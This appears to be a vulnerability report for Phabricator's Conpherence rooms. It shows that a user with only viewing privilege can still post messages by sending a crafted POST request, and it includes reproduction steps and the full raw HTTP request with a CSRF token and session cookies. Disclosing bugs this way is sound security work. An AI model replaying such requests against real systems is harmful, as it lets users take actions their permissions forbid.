As expected, there's no form to send messages when the user access the room since in theory it shouldn't be possible. However, messages via POST requests can still be sent and processed.\n\nThe Severity of this issue is marked as low, but it still can be a serious problem depending on the scenario.\n\nSteps to reproduce\n====================\n\n1. Create a new room\n2. Give **only** Viewing Privilege to a user or all users\n3. Send the following POST as the user with Viewing Privilege only\n4. Refresh browser and see the message sent\n\n```\nPOST /conpherence/update/1/ HTTP/1.1\nHost: 192.168.25.10\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Phabricator-Csrf: B@6uaixbh422c60ea95853fee4\nX-Phabricator-Via: /\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 110\nCookie: phsid=35yvcfc22xj27th6hwawazghx5cnritidfccxdhh; phusr=lucasveiga\nConnection: close\n\n__form__=1\u0026action=message\u0026text=TESTTEXT\u0026latest_transaction_id=10\u0026__wflow__=true\u0026__ajax__=true\u0026__metablock__=6\n```\n\nThis isn't session related since logging in and out doesn't affect anything.
